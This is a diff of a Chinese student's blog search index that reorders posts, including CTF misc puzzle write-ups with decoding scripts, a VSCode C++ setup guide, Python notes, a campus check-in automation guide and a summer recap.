+<h2 id="一个不小的文件"><a href="#一个不小的文件" class="headerlink" title="一个不小的文件"></a>一个不小的文件</h2><p>文件很大，最后=结尾，怀疑base64，观察前几个字符，怀疑base64套娃，直接上脚本获得flag</p>
+<pre><code>#-*- coding:utf-8 -*-
+import base64
+
+s=&#39;&#39;
+with open(&#39;problem.txt&#39;, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:
+    s=&quot;&quot;.join(f.readlines()).encode(&#39;utf-8&#39;)
+src=s
+while True:
+    try:
+        src=s
+        s=base64.b64decode(s)
+        str(s,&#39;utf-8&#39;)
+        continue
+    except:
+        pass
+    break
+with open(&#39;result.txt&#39;,&#39;w&#39;, encoding=&#39;utf-8&#39;) as file:
+    file.write(str(src,&#39;utf-8&#39;))
+print(&quot;ok!&quot;)
 </code></pre>
-<p>// 向下取整  /简单除法</p>
-<h4 id="string"><a href="#string" class="headerlink" title="string"></a>string</h4><pre><code>str = &#39;helloworld&#39;
-str[0:-1] # 第一个到倒数第二个的所有字符
-str[0]    # 第一个字符
-str[2:5]  # 3到5字符
-str[2:]   # 3到最后
-str * 2   # 输出2次
-str + &#39; &#39; # 连接字符串
+<h2 id="嗷呜"><a href="#嗷呜" class="headerlink" title="嗷呜"></a>嗷呜</h2><p>这个属实被整懵逼了，兽音译者翻译后获得</p>
+<pre><code>fc34f44b75ae100abb2af0e28b9251e5e59b5faf
 </code></pre>
-<p>反斜杠可以用来转义，使用r可以让反斜杠不发生转义。</p>
-<h4 id="List"><a href="#List" class="headerlink" title="List"></a>List</h4><p>和字符串一样，列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表。</p>
-<p>列表截取</p>
-<pre><code>变量[头下标:尾下标]
+<p>最后给hint才知道是个p2p种子</p>
+<pre><code>payload：magnet:?xt=urn:btih:fc34f44b75ae100abb2af0e28b9251e5e59b5faf
 </code></pre>
-<p><img src="https://www.runoob.com/wp-content/uploads/2014/08/list_slicing1_new1.png" alt="img"></p>
+<p>下载后零宽字符隐写，网站解码获得flag</p>
+<h2 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h2><p>wireshark打开，发现全是USB协议，了解了一下，1.9.1的最后8个字节记录键盘数据，不断在变，直接用tshark提取不出来，对着表一个个对，获得flag</p>
+<h2 id="LRU"><a href="#LRU" class="headerlink" title="LRU"></a>LRU</h2><p>直接贴脚本</p>
+<pre><code>def replace_word(l, a):
+    l.remove(a)
+    l.append(a)
+    return l
+
+
+str = &#39;3 0 @ &#123; o e f m t c y f e o &#123; @ 0 3 a u o r t r o u a 3 o @ &#123; e f y e &#123; @ o 3 a u o r 0 _ i o u e y g a 3 @ h 0 _ t o u e y b 3 a @ _ 0 d c @ a 3 b g e u o f t y g j k z c v f h j k v n m r t u i p k j y t r f v n m d e w o i u h g r k l m u t r e d f h n b f d e u i o p l m n g h y t r e w a q z x c f h j y e s &#125; j h f c x z q a b d e g&#39;
+i_str = list(&#39;cfmteo&#123;@0uya&#39;)
+s_str = str.split(&#39; &#39;)
+flag = []
+
+for i in s_str:
+        if i in i_str:
+            i_str = replace_word(i_str, i)
+        else:
+            a, *i_str = i_str
+            i_str.append(i)
+            flag.append(a)
+        print(i_str)
+print(&#39;&#39;.join(flag))
+</code></pre>
 ]]></content>
       <categories>
-        <category>python学习</category>
+        <category>ctf学习</category>
       </categories>
       <tags>
-        <tag>python</tag>
+        <tag>ctf</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>VSCode简单配置C艹环境</title>
+    <url>/posts/c150e260/</url>
+    <content><![CDATA[<h2 id="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"><a href="#百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode" class="headerlink" title="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"></a>百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode</h2><h2 id="脑子是个好东西，建议多动手才好用"><a href="#脑子是个好东西，建议多动手才好用" class="headerlink" title="脑子是个好东西，建议多动手才好用"></a>脑子是个好东西，建议多动手才好用</h2><h2 id="需要的东西已打包，还学不会，建议回家种地"><a href="#需要的东西已打包，还学不会，建议回家种地" class="headerlink" title="需要的东西已打包，还学不会，建议回家种地"></a>需要的东西已打包，还学不会，建议回家种地</h2><h2 id="VSCode在官网上下，别TM随便找到个能下的就下"><a href="#VSCode在官网上下，别TM随便找到个能下的就下" class="headerlink" title="VSCode在官网上下，别TM随便找到个能下的就下"></a>VSCode在官网上下，别TM随便找到个能下的就下</h2><blockquote>
+<p>已经帮好几个人装了VSCode，没意思，就这nt操作浪费时间实属没必要，下面详细操作，希望看到的多多传播，不要再白白耗费时间在这无意义的事上</p>
+</blockquote>
+<ol>
+<li>下载链接中的东西</li>
+</ol>
+<ul>
+<li><p>链接：<a href="https://pan.baidu.com/s/1cY9v4UrhH_n61JUoQeXn0Q">https://pan.baidu.com/s/1cY9v4UrhH_n61JUoQeXn0Q</a> 提取码：upvq</p>
+</li>
+<li><p>链接：<a href="https://pan.baidu.com/s/12HPe2Mh3yt-eTiA9Quai8Q">https://pan.baidu.com/s/12HPe2Mh3yt-eTiA9Quai8Q</a> 提取码：zh7k</p>
+</li>
+</ul>
+<ol start="2">
+<li><p>将mingw-w64解压后直接拖入C盘</p>
+</li>
+<li><p>新建fuck文件夹，将.vscode解压后拖入该文件夹中</p>
+</li>
+<li><p>将下面这句添加环境变量,path中新建，不会的百度</p>
+<p> C:\mingw-w64\x86_64-8.1.0-posix-seh-rt_v6-rev0\mingw64\bin</p>
+</li>
+<li><p>vscode中安装必要插件，与C++有关的建议看不懂英文的全装，看的懂的选有用的装，懒得看的也全装</p>
+</li>
+<li><p>右键fuck文件夹，选通过vscode打开,写helloworld测试</p>
+</li>
+<li><p>运行成功的皆大欢喜,不成功的重复1-6步100-200遍，还不成功的，老老实实用你的devc++</p>
+</li>
+<li><p>over</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>哎，我就是玩</category>
+      </categories>
   </entry>
   <entry>
     <title>git学习</title>
@@ -1320,43 +1340,6 @@ str + &#39; &#39; # 连接字符串
       </tags>
   </entry>
   <entry>
-    <title>VSCode简单配置C艹环境</title>
-    <url>/posts/c150e260/</url>
-    <content><![CDATA[<h2 id="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"><a href="#百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode" class="headerlink" title="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"></a>百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode</h2><h2 id="脑子是个好东西，建议多动手才好用"><a href="#脑子是个好东西，建议多动手才好用" class="headerlink" title="脑子是个好东西，建议多动手才好用"></a>脑子是个好东西，建议多动手才好用</h2><h2 id="需要的东西已打包，还学不会，建议回家种地"><a href="#需要的东西已打包，还学不会，建议回家种地" class="headerlink" title="需要的东西已打包，还学不会，建议回家种地"></a>需要的东西已打包，还学不会，建议回家种地</h2><h2 id="VSCode在官网上下，别TM随便找到个能下的就下"><a href="#VSCode在官网上下，别TM随便找到个能下的就下" class="headerlink" title="VSCode在官网上下，别TM随便找到个能下的就下"></a>VSCode在官网上下，别TM随便找到个能下的就下</h2><blockquote>
-<p>已经帮好几个人装了VSCode，没意思，就这nt操作浪费时间实属没必要，下面详细操作，希望看到的多多传播，不要再白白耗费时间在这无意义的事上</p>
-</blockquote>
-<ol>
-<li>下载链接中的东西</li>
-</ol>
-<ul>
-<li><p>链接：<a href="https://pan.baidu.com/s/1cY9v4UrhH_n61JUoQeXn0Q">https://pan.baidu.com/s/1cY9v4UrhH_n61JUoQeXn0Q</a> 提取码：upvq</p>
-</li>
-<li><p>链接：<a href="https://pan.baidu.com/s/12HPe2Mh3yt-eTiA9Quai8Q">https://pan.baidu.com/s/12HPe2Mh3yt-eTiA9Quai8Q</a> 提取码：zh7k</p>
-</li>
-</ul>
-<ol start="2">
-<li><p>将mingw-w64解压后直接拖入C盘</p>
-</li>
-<li><p>新建fuck文件夹，将.vscode解压后拖入该文件夹中</p>
-</li>
-<li><p>将下面这句添加环境变量,path中新建，不会的百度</p>
-<p> C:\mingw-w64\x86_64-8.1.0-posix-seh-rt_v6-rev0\mingw64\bin</p>
-</li>
-<li><p>vscode中安装必要插件，与C++有关的建议看不懂英文的全装，看的懂的选有用的装，懒得看的也全装</p>
-</li>
-<li><p>右键fuck文件夹，选通过vscode打开,写helloworld测试</p>
-</li>
-<li><p>运行成功的皆大欢喜,不成功的重复1-6步100-200遍，还不成功的，老老实实用你的devc++</p>
-</li>
-<li><p>over</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>哎，我就是玩</category>
-      </categories>
-  </entry>
-  <entry>
     <title>nextcloud安装及踩坑指南</title>
     <url>/posts/aa5139ab/</url>
     <content><![CDATA[<blockquote>
@@ -1416,6 +1399,47 @@ str + &#39; &#39; # 连接字符串
       </categories>
       <tags>
         <tag>server</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python学习笔记</title>
+    <url>/posts/743c31e9/</url>
+    <content><![CDATA[<h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><h3 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h3><ul>
+<li>number</li>
+<li>string</li>
+<li>list</li>
+<li>tuple</li>
+<li>set</li>
+<li>dict</li>
+</ul>
+<p>num string tuple 可变</p>
+<p>list dict set 不可变</p>
+<h4 id="num"><a href="#num" class="headerlink" title="num"></a>num</h4><p>type() 查看类型</p>
+<p>del删除对象</p>
+<pre><code>del var
+del var_a, var_b
+</code></pre>
+<p>// 向下取整  /简单除法</p>
+<h4 id="string"><a href="#string" class="headerlink" title="string"></a>string</h4><pre><code>str = &#39;helloworld&#39;
+str[0:-1] # 第一个到倒数第二个的所有字符
+str[0]    # 第一个字符
+str[2:5]  # 3到5字符
+str[2:]   # 3到最后
+str * 2   # 输出2次
+str + &#39; &#39; # 连接字符串
+</code></pre>
+<p>反斜杠可以用来转义，使用r可以让反斜杠不发生转义。</p>
+<h4 id="List"><a href="#List" class="headerlink" title="List"></a>List</h4><p>和字符串一样，列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表。</p>
+<p>列表截取</p>
+<pre><code>变量[头下标:尾下标]
+</code></pre>
+<p><img src="https://www.runoob.com/wp-content/uploads/2014/08/list_slicing1_new1.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>python学习</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -1490,6 +1514,57 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
+    <title>中国矿业大学今日校园自动打卡python实现</title>
+    <url>/posts/f7c1df40/</url>
+    <content><![CDATA[<blockquote>
+<p>寒假就有这个打算了，但在家太懒了，懒得弄，在学校上网课太无聊了，就基于子墨大佬的<a href="https://github.com/ZimoLoveShuang/auto-submit">Github项目</a>改了改，用了一天终于搞完了，弄成了矿大专属的，现在对矿大的学生来说是傻瓜式操作了。</p>
+</blockquote>
+<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//github.com/Haorical/CUMT-CampusDaily-auto-submit</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="最终成品"><a href="#最终成品" class="headerlink" title="最终成品"></a>最终成品</h1><p><img src="https://img-blog.csdnimg.cn/20210310174220497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70"></p>
+<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><ol>
+<li><p> git克隆代码到本地，有用的是下面3个文件<br><img src="https://img-blog.csdnimg.cn/20210310174431200.png" alt="在这里插入图片描述"><br>其中config.yml是配置文件，也就是需要改的；<br>index.py是运行文件，不用管;<br>requirements.txt是依赖文件;</p>
+</li>
+<li><p>安装依赖环境，pip命令安装</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li>
+<li><p>更改config里面的设置，学号和密码<br><img src="https://img-blog.csdnimg.cn/2021031017573045.png" alt="在这里插入图片描述"></p>
+</li>
+<li><p>config设置里面一开始的api,由于是我自己的服务器，就不分享了，可以选择自己搭建，<a href="https://blog.zimo.wiki/posts/6c809f81/">点这里</a>，教程挺详细的。还有server酱如果你需要的话，百度就行。</p>
+</li>
+<li><p>到现在为止就ok了，运行index.py就能实现打卡。但我们需要的是实现自动打卡，实现自动打卡有好多方式：windows计划任务或者腾讯云函数比较常见，当然有服务器的话直接挂服务器上就行。<br><a href="https://jingyan.baidu.com/article/154b463130041128ca8f41c7.html">windows计划任务设置</a></p>
+</li>
+</ol>
+<p><strong>腾讯云函数：</strong><br>1.打开百度搜索腾讯云函数，注册认证后，进入控制台，点击左边的层，然后点新建，名称随意，然后点击上传zip，选择release中的dependency.zip上传，然后选择运行环境python3.6，然后点击确定，耐心等待一下，上传依赖包需要花费的时间比较长<br><img src="https://img-blog.csdnimg.cn/20210310181911184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<pre><code>2.新建腾讯云函数依赖点左边的函数服务，新建云函数，名称随意，运行环境选择python3.6，创建方式选择空白函数，然后点击下一步 新建腾讯云函数
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20210310182002675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<pre><code>3.提交方法选择在线编辑，把本地修改好的index.py直接全文复制粘贴到云函数的index.py，然后点击文件-&gt;新建，文件名命名为config.yml，然后把本地配置好的config.yml文件中的内容直接全文复制粘贴到云函数的config.yml文件，点击下面的高级设置，设置超时时间为60秒，添加层为刚刚新建的函数依赖层，然后点击完成
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210310182013762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70)
+4.配置腾讯云函数
+进入新建好的云函数，左边点击触发管理，点击创建触发器，名称随意，触发周期选择自定义，然后配置cron表达式，下面的表达式表示每天中午十二点整执行
+</code></pre>
+<p>0 0 12 * * * *<br>    5.然后就可以测试云函数了，绿色代表云函数执行成功，红色代表云函数执行失败（失败的原因大部分是由于依赖造成的）。返回结果是success.，代表自动提交成功，如遇到问题，请仔细查看日志<br>    &gt;这是子墨写的，我直接挂在服务器上了，没这么麻烦</p>
+<h1 id="遇到的BUG"><a href="#遇到的BUG" class="headerlink" title="遇到的BUG"></a>遇到的BUG</h1><ul>
+<li>因为子墨很久没更新了，今日校园升级了接口，直接打开项目，会报错，我直接在index.py里把学校默认成矿大了，就不需要调用了</li>
+<li>子墨提供的今日校园模拟登录的api貌似不能用，我根据他另一个项目自己搭建了一个</li>
+<li>显示提交错误，这个是因为今日校园des更换密钥了。</li>
+<li>去除了一些无关的代码，比如图像上传什么的，不需要</li>
+</ul>
+<h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
+<p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
+<blockquote>
+<p>邮箱： <a href="mailto:&#105;&#107;&#x61;&#101;&#107;&#x6b;&#107;&#64;&#x64;&#105;&#110;&#103;&#x74;&#97;&#108;&#107;&#x2e;&#99;&#x6f;&#x6d;">&#105;&#107;&#x61;&#101;&#107;&#x6b;&#107;&#64;&#x64;&#105;&#110;&#103;&#x74;&#97;&#108;&#107;&#x2e;&#99;&#x6f;&#x6d;</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>哎，我就是玩</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>中国矿业大学正方教务爬虫</title>
     <url>/posts/6f73e94e/</url>
     <content><![CDATA[<h1 id="中国矿业大学正方教务爬虫"><a href="#中国矿业大学正方教务爬虫" class="headerlink" title="中国矿业大学正方教务爬虫"></a>中国矿业大学正方教务爬虫</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>项目地址：</strong></p>
@@ -1555,57 +1630,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
         <tag>ctf</tag>
         <tag>sql注入</tag>
         <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>中国矿业大学今日校园自动打卡python实现</title>
-    <url>/posts/f7c1df40/</url>
-    <content><![CDATA[<blockquote>
-<p>寒假就有这个打算了，但在家太懒了，懒得弄，在学校上网课太无聊了，就基于子墨大佬的<a href="https://github.com/ZimoLoveShuang/auto-submit">Github项目</a>改了改，用了一天终于搞完了，弄成了矿大专属的，现在对矿大的学生来说是傻瓜式操作了。</p>
-</blockquote>
-<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//github.com/Haorical/CUMT-CampusDaily-auto-submit</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="最终成品"><a href="#最终成品" class="headerlink" title="最终成品"></a>最终成品</h1><p><img src="https://img-blog.csdnimg.cn/20210310174220497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70"></p>
-<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><ol>
-<li><p> git克隆代码到本地，有用的是下面3个文件<br><img src="https://img-blog.csdnimg.cn/20210310174431200.png" alt="在这里插入图片描述"><br>其中config.yml是配置文件，也就是需要改的；<br>index.py是运行文件，不用管;<br>requirements.txt是依赖文件;</p>
-</li>
-<li><p>安装依赖环境，pip命令安装</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li>
-<li><p>更改config里面的设置，学号和密码<br><img src="https://img-blog.csdnimg.cn/2021031017573045.png" alt="在这里插入图片描述"></p>
-</li>
-<li><p>config设置里面一开始的api,由于是我自己的服务器，就不分享了，可以选择自己搭建，<a href="https://blog.zimo.wiki/posts/6c809f81/">点这里</a>，教程挺详细的。还有server酱如果你需要的话，百度就行。</p>
-</li>
-<li><p>到现在为止就ok了，运行index.py就能实现打卡。但我们需要的是实现自动打卡，实现自动打卡有好多方式：windows计划任务或者腾讯云函数比较常见，当然有服务器的话直接挂服务器上就行。<br><a href="https://jingyan.baidu.com/article/154b463130041128ca8f41c7.html">windows计划任务设置</a></p>
-</li>
-</ol>
-<p><strong>腾讯云函数：</strong><br>1.打开百度搜索腾讯云函数，注册认证后，进入控制台，点击左边的层，然后点新建，名称随意，然后点击上传zip，选择release中的dependency.zip上传，然后选择运行环境python3.6，然后点击确定，耐心等待一下，上传依赖包需要花费的时间比较长<br><img src="https://img-blog.csdnimg.cn/20210310181911184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<pre><code>2.新建腾讯云函数依赖点左边的函数服务，新建云函数，名称随意，运行环境选择python3.6，创建方式选择空白函数，然后点击下一步 新建腾讯云函数
-</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/20210310182002675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<pre><code>3.提交方法选择在线编辑，把本地修改好的index.py直接全文复制粘贴到云函数的index.py，然后点击文件-&gt;新建，文件名命名为config.yml，然后把本地配置好的config.yml文件中的内容直接全文复制粘贴到云函数的config.yml文件，点击下面的高级设置，设置超时时间为60秒，添加层为刚刚新建的函数依赖层，然后点击完成
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210310182013762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70)
-4.配置腾讯云函数
-进入新建好的云函数，左边点击触发管理，点击创建触发器，名称随意，触发周期选择自定义，然后配置cron表达式，下面的表达式表示每天中午十二点整执行
-</code></pre>
-<p>0 0 12 * * * *<br>    5.然后就可以测试云函数了，绿色代表云函数执行成功，红色代表云函数执行失败（失败的原因大部分是由于依赖造成的）。返回结果是success.，代表自动提交成功，如遇到问题，请仔细查看日志<br>    &gt;这是子墨写的，我直接挂在服务器上了，没这么麻烦</p>
-<h1 id="遇到的BUG"><a href="#遇到的BUG" class="headerlink" title="遇到的BUG"></a>遇到的BUG</h1><ul>
-<li>因为子墨很久没更新了，今日校园升级了接口，直接打开项目，会报错，我直接在index.py里把学校默认成矿大了，就不需要调用了</li>
-<li>子墨提供的今日校园模拟登录的api貌似不能用，我根据他另一个项目自己搭建了一个</li>
-<li>显示提交错误，这个是因为今日校园des更换密钥了。</li>
-<li>去除了一些无关的代码，比如图像上传什么的，不需要</li>
-</ul>
-<h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
-<p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
-<blockquote>
-<p>邮箱： <a href="mailto:&#105;&#x6b;&#97;&#101;&#x6b;&#x6b;&#107;&#64;&#x64;&#x69;&#x6e;&#x67;&#116;&#x61;&#108;&#x6b;&#x2e;&#x63;&#111;&#109;">&#105;&#x6b;&#97;&#101;&#x6b;&#x6b;&#107;&#64;&#x64;&#x69;&#x6e;&#x67;&#116;&#x61;&#108;&#x6b;&#x2e;&#x63;&#111;&#109;</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>哎，我就是玩</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -1711,31 +1735,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
-    <title>暑假总结</title>
-    <url>/posts/123f4dc2/</url>
-    <content><![CDATA[<p>不知不觉暑假结束了，这两天写完实习报告终于有时间能简单的总结一下了。</p>
-<ul>
-<li><p>python入门到精通</p>
-</li>
-<li><p>数学建模学了一点点，matlab基本是会用了</p>
-</li>
-<li><p>ctf把bugku上的web刷完了，正在刷buu，学的东西还挺多的，也打了几次线上，感觉好难，道阻且长</p>
-</li>
-<li><p>折腾服务器，搭建了私有云</p>
-</li>
-<li><p>linux 使用的更熟练了，包括docker了等等</p>
-</li>
-<li><p>学会了git使用外加GitHub，之前不是很会</p>
-</li>
-<li><p>洛克王国天梯打到了高级段位</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
     <title>爬取冰冰vlog.001评论&amp;&amp;做词云</title>
     <url>/posts/6d65a59f/</url>
     <content><![CDATA[<blockquote>
@@ -1770,6 +1769,31 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>python</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>暑假总结</title>
+    <url>/posts/123f4dc2/</url>
+    <content><![CDATA[<p>不知不觉暑假结束了，这两天写完实习报告终于有时间能简单的总结一下了。</p>
+<ul>
+<li><p>python入门到精通</p>
+</li>
+<li><p>数学建模学了一点点，matlab基本是会用了</p>
+</li>
+<li><p>ctf把bugku上的web刷完了，正在刷buu，学的东西还挺多的，也打了几次线上，感觉好难，道阻且长</p>
+</li>
+<li><p>折腾服务器，搭建了私有云</p>
+</li>
+<li><p>linux 使用的更熟练了，包括docker了等等</p>
+</li>
+<li><p>学会了git使用外加GitHub，之前不是很会</p>
+</li>
+<li><p>洛克王国天梯打到了高级段位</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
   </entry>
   <entry>
     <title>蓝桥杯感想</title>
